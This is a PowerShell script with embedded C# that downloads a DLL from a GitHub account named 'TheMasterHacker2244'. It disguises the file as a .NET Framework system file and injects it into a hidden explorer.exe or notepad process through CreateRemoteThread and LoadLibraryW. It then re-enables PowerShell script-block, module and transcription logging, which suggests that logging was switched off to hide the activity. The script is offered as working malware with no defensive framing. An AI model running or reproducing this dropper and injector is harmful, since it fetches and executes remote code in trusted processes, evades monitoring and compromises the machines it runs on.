$ErrorActionPreference = 'Continue'
Write-Host "[*] Starting..."

# DLL settings
$dllPath = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
$dllUri = "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll"

# Download
Write-Host "[*] Downloading DLL..."
New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
try {
    Invoke-WebRequest -Uri $dllUri -OutFile $dllPath -ErrorAction Stop
    Write-Host "[+] DLL downloaded ($((Get-Item $dllPath).Length) bytes)"
} catch {
    Write-Host "[-] Download failed: $_"
    exit
}

# Check architecture
$dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
$peOffset = [System.BitConverter]::ToInt32($dllBytes, 0x3C)
$machine = [System.BitConverter]::ToUInt16($dllBytes, $peOffset + 4)
$is64 = $machine -eq 0x8664
Write-Host "[*] DLL is $((Get-Item $dllPath).Length) bytes, machine type = 0x$($machine.ToString('X')) ($(if($is64){'64-bit'}else{'32-bit'}))"

# Choose target
if ($is64) {
    $targetName = 'explorer'
    $targetPath = "$env:SystemRoot\explorer.exe"
} else {
    if ([Environment]::Is64BitOperatingSystem) {
        $targetName = 'notepad'
        $targetPath = "$env:SystemRoot\SysWOW64\notepad.exe"
    } else {
        $targetName = 'notepad'
        $targetPath = "$env:SystemRoot\System32\notepad.exe"
    }
}
Write-Host "[*] Target: $targetName ($targetPath)"

# Stop existing target and start new
Get-Process -Name $targetName -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 2
$proc = Start-Process -FilePath $targetPath -PassThru -WindowStyle Hidden
Start-Sleep 2
if ($proc.HasExited) {
    Write-Host "[-] Target process exited immediately"
    exit
}
Write-Host "[+] Target PID: $($proc.Id)"

# C# injector
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class DiagInj {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32")] public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
    [DllImport("kernel32")] public static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
    [DllImport("kernel32")] public static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
    [DllImport("kernel32")] public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

    const uint TH32CS_SNAPMODULE = 0x00000008;
    const uint TH32CS_SNAPMODULE32 = 0x00000010;

    [StructLayout(LayoutKind.Sequential)]
    public struct MODULEENTRY32 {
        public uint dwSize;
        public uint th32ModuleID;
        public uint th32ProcessID;
        public uint GlblcntUsage;
        public uint ProccntUsage;
        public IntPtr modBaseAddr;
        public uint modBaseSize;
        public IntPtr hModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExePath;
    }

    public static bool IsModuleLoaded(int pid, string dllName) {
        IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, (uint)pid);
        if (snapshot == (IntPtr)(-1)) return false;
        MODULEENTRY32 me = new MODULEENTRY32();
        me.dwSize = (uint)Marshal.SizeOf(me);
        if (!Module32First(snapshot, ref me)) { CloseHandle(snapshot); return false; }
        do {
            if (me.szModule.Equals(dllName, StringComparison.OrdinalIgnoreCase)) { CloseHandle(snapshot); return true; }
        } while (Module32Next(snapshot, ref me));
        CloseHandle(snapshot);
        return false;
    }

    public static string ClassicInject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
        if (hProcess == IntPtr.Zero) return "OpenProcess failed: " + Marshal.GetLastWin32Error();
        byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        uint dllSize = (uint)dllBytes.Length;
        IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllSize, 0x3000, 0x4);
        if (remoteMem == IntPtr.Zero) { CloseHandle(hProcess); return "VirtualAllocEx failed: " + Marshal.GetLastWin32Error(); }
        uint written;
        WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, out written);
        if (written != dllSize) { CloseHandle(hProcess); return "WriteProcessMemory incomplete"; }
        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, remoteMem, 0, IntPtr.Zero);
        if (remoteThread == IntPtr.Zero) { CloseHandle(hProcess); return "CreateRemoteThread failed: " + Marshal.GetLastWin32Error(); }
        WaitForSingleObject(remoteThread, 0xFFFFFFFF);
        uint exitCode;
        GetExitCodeThread(remoteThread, out exitCode);
        CloseHandle(remoteThread);
        CloseHandle(hProcess);
        return exitCode != 0 ? "OK" : "LoadLibrary returned NULL";
    }
}
'@ -ReferencedAssemblies System.Runtime.InteropServices

$dllName = [System.IO.Path]::GetFileName($dllPath)
$result = [DiagInj]::ClassicInject($proc.Id, $dllPath)
Write-Host "[*] Injection result: $result"

if ($result -eq "OK") {
    Start-Sleep -Milliseconds 500
    $loaded = [DiagInj]::IsModuleLoaded($proc.Id, $dllName)
    if ($loaded) {
        Write-Host "[+] DLL loaded in target"
    } else {
        Write-Host "[-] Module not found in process (maybe unloaded or blocked)"
    }
} else {
    Write-Host "[-] Injection failed: $result"
}

# Re-enable logging
$basePath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
Set-ItemProperty -Path "$basePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force
Set-ItemProperty -Path "$basePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force
Set-ItemProperty -Path "$basePath\Transcription" -Name 'EnableTranscripting' -Value 1 -Force
$corePath = 'HKLM:\Software\Policies\Microsoft\PowerShellCore'
if (Test-Path "$corePath\ScriptBlockLogging") { Set-ItemProperty -Path "$corePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force }
if (Test-Path "$corePath\ModuleLogging") { Set-ItemProperty -Path "$corePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force }
Write-Host "[*] Logging re-enabled"
